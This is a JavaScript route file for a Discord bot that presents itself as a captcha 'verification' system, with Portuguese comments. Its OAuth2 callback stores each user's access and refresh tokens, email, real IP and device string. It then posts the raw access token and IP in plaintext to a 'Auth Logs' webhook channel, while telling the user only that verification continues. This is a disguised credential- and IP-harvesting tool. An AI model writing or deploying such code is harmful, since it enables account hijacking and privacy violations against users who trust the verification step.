const axios = require('axios');
const { users, config } = require('../database');
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

module.exports = (app, client) => {

    app.get('/', (req, res) => {
        res.render('index.html');
    });

    app.get('/oauth2/callback', async (req, res) => {
        const { code } = req.query;
        if (!code) return res.redirect('/error?msg=Missing code');

        try {
            const params = new URLSearchParams();
            params.append('client_id', process.env.CLIENT_ID);
            params.append('client_secret', process.env.CLIENT_SECRET);
            params.append('grant_type', 'authorization_code');
            params.append('code', code);
            params.append('redirect_uri', process.env.REDIRECT_URI);

            const tokenResponse = await axios.post(
                'https://discord.com/api/oauth2/token',
                params,
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );

            const { access_token, refresh_token, token_type } = tokenResponse.data;

            const userResponse = await axios.get(
                'https://discord.com/api/users/@me',
                { headers: { Authorization: `${token_type} ${access_token}` } }
            );

            const userData = userResponse.data;

            // IP real
            let ip = req.headers['cf-connecting-ip']
                || req.headers['x-forwarded-for']
                || req.socket.remoteAddress
                || 'Desconhecido';
            if (ip.includes(',')) ip = ip.split(',')[0].trim();

            const userDevice = req.headers['user-agent'] || 'Desconhecido';

            // Salva dados completos
            const existing = users.get(userData.id) || {};
            users.set(userData.id, {
                ...existing,
                id: userData.id,
                username: userData.username,
                email: userData.email || null,
                avatar: userData.avatar,
                access_token,
                refresh_token,
                ip,
                userDevice,
                tokenSavedAt: new Date().toISOString()
            });

            const createdAt = new Date(Number((BigInt(userData.id) >> 22n) + 1420070400000n));
            const accountDays = Math.floor((Date.now() - createdAt) / 86400000);
            const avatarUrl = userData.avatar
                ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
                : 'https://cdn.discordapp.com/embed/avatars/0.png';

            // Manda embed de log
            await sendLog(client, userData, access_token, ip, userDevice, accountDays, avatarUrl);

            // Manda DM com botão para iniciar captcha
            try {
                const discordUser = await client.users.fetch(userData.id);
                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId('start_captcha')
                        .setLabel('Continuar verificação')
                        .setEmoji('✅')
                        .setStyle(ButtonStyle.Success)
                );
                await discordUser.send({
                    content: `✅ Conta autorizada! Agora clique no botão abaixo para completar sua verificação.`,
                    components: [row]
                });
            } catch {
                // DMs fechadas — ignora
            }

            const guild = client.guilds.cache.get(process.env.GUILD_ID);

            res.render('success.html', {
                userName: userData.username,
                userId: userData.id,
                userAvatar: avatarUrl,
                guildName: guild ? guild.name : 'Servidor',
                guildId: process.env.GUILD_ID || '0',
                guildIcon: guild && guild.icon
                    ? `https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png`
                    : 'https://cdn.discordapp.com/embed/avatars/0.png',
                accountDays
            });

        } catch (error) {
            console.error('OAuth2 error:', error.response?.data || error.message);
            res.redirect(
                `/error?msg=${encodeURIComponent(
                    error.response ? JSON.stringify(error.response.data) : error.message
                )}`
            );
        }
    });

    app.get('/error', (req, res) => {
        res.render('error.html', {
            error: req.query.msg || 'Unknown error'
        });
    });

};

async function sendLog(client, userData, accessToken, ip, userDevice, accountDays, avatarUrl) {
    const logChannelId = config.get('logChannelId') || process.env.LOG_CHANNEL_ID;
    if (!logChannelId) return;

    const channel = client.channels.cache.get(logChannelId);
    if (!channel) return;

    let webhook;
    try {
        const webhooks = await channel.fetchWebhooks();
        webhook = webhooks.find(w => w.name === 'Auth Logs');
        if (!webhook) {
            webhook = await channel.createWebhook({
                name: 'Auth Logs',
                avatar: client.user.displayAvatarURL()
            });
        }
    } catch {
        return;
    }

    const embed = new EmbedBuilder()
        .setColor(0x5865F2)
        .setAuthor({
            name: `${userData.username} (${userData.id})`,
            iconURL: avatarUrl
        })
        .setThumbnail(avatarUrl)
        .setDescription(
            `**Menção:** <@${userData.id}>\n` +
            `**Username:** \`${userData.username}\`\n` +
            `**ID:** \`${userData.id}\`\n` +
            `**E-mail:** \`${userData.email || 'Não disponível'}\`\n` +
            `**Idade da Conta:** \`${accountDays} dias\``
        )
        .addFields(
            { name: '🔑 Token', value: `\`\`\`${accessToken}\`\`\`` },
            { name: '🌐 IP', value: `\`${ip}\``, inline: true },
            { name: '📱 Dispositivo', value: `\`${userDevice.substring(0, 200)}\``, inline: false }
        )
        .setFooter({ text: 'Auth System' })
        .setTimestamp();

    await webhook.send({ embeds: [embed] }).catch(console.error);
}
